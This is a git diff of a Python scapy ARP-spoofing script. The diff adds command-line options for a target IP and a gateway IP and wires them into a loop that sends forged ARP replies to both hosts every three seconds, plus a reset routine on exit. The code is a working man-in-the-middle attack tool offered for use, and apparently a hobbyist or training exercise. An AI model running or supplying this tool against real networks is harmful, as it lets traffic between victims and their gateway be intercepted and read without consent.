@@ -1,6 +1,6 @@
 import scapy.all as scapy
 import time
-
+import optparse
 
 def GetMacAdress(ip):
 
@@ -27,21 +27,41 @@ def ResetOperation(fooledIP, gatewayIP):
     arpResponse = scapy.ARP(op=2, pdst=fooledIP, hwdst=fooledMac, psrc=gatewayIP, hwsrc=gatewayMac)
     scapy.send(arpResponse, verbose=False, count = 6)
 
+def GetUserInput():
+    parseObject = optparse.OptionParser()
+    parseObject.add_option("-t", "--target", dest = "targetIP", help="Enter Target IP")
+    parseObject.add_option("-g","--gateway", dest="gatewayIP", help="Enter Gateway IP")
+    options = parseObject.parse_args()[0]
+
+    if not options.targetIP:
+        print("Enter Target IP")
+    if not options.gatewayIP:
+        print("Enter Gateway IP")
+
+    return options
+
 
 number = 0
+
+userIps = GetUserInput()
+userTargetIp = userIps.targetIP
+userGatewayIp = userIps.gatewayIP
+
 try:
     while True:
 
         print("\rTotal packages sent {}".format(number),end="")
 
-        ArpPoisoning("", "")
-        ArpPoisoning("1", "")
+        ArpPoisoning(userTargetIp, userGatewayIp)
+        ArpPoisoning(userGatewayIp, userTargetIp)
 
         time.sleep(3)
         number += 2
 
-        #You can stop the loop by ctrl+c.
+
 except KeyboardInterrupt:
     print("\nQuit&Reset")
-    ResetOperation("","")
-    ResetOperation("","")
+    ResetOperation(userTargetIp,userGatewayIp,)
+    ResetOperation(userGatewayIp,userTargetIp)
+
+    #You can stop the loop by ctrl+c.
